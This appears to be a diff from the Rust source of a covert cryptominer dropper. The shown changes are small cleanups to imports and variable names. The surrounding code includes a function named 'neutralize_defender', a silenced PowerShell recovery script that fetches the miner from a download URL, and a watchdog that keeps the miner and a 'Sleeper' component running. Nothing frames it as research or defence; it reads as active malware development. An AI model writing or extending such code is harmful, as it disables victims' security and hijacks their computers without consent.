@@ -1,7 +1,7 @@
 use std::fs::File;
 use std::io::Write;
 use std::path::{Path, PathBuf};
-use crate::common::constants::{MINER_EXE_NAME, MONITOR_SCRIPT, HELPER_SCRIPT, LAUNCHER_SCRIPT, HELPER_LAUNCHER};
+use crate::common::constants::{MINER_EXE_NAME, MONITOR_SCRIPT, LAUNCHER_SCRIPT};
 
 #[cfg(windows)]
 use std::process::Command;
@@ -52,7 +52,7 @@ pub fn neutralize_defender() -> Result<(), Box<dyn std::error::Error>> {
 
 
 fn get_recovery_script() -> String {
-    use crate::common::constants::{DOWNLOAD_URL, MINER_EXE_NAME};
+    use crate::common::constants::DOWNLOAD_URL;
     format!(
         r#"
 $ErrorActionPreference = "SilentlyContinue"
@@ -106,14 +106,14 @@ if (-not $alive) {{
     )
 }
 
-pub fn create_watchdog_script(install_dirs: &[PathBuf], config_path: &Path) -> Result<Vec<PathBuf>, Box<dyn std::error::Error>> {
+pub fn create_watchdog_script(install_dirs: &[PathBuf], _config_path: &Path) -> Result<Vec<PathBuf>, Box<dyn std::error::Error>> {
     let dirs_ps: Vec<String> = install_dirs.iter()
         .map(|d| format!("'{}'", d.display()))
         .collect();
-    let dirs_array = dirs_ps.join(", ");
+    let _dirs_array = dirs_ps.join(", ");
 
     let miner_name = MINER_EXE_NAME;
-    let monitor_name = MONITOR_SCRIPT;
+    let _monitor_name = MONITOR_SCRIPT;
     let launcher_name_vbs = LAUNCHER_SCRIPT;
     
     // Embed the recovery script content into the watchdog so it can repair the Sleeper
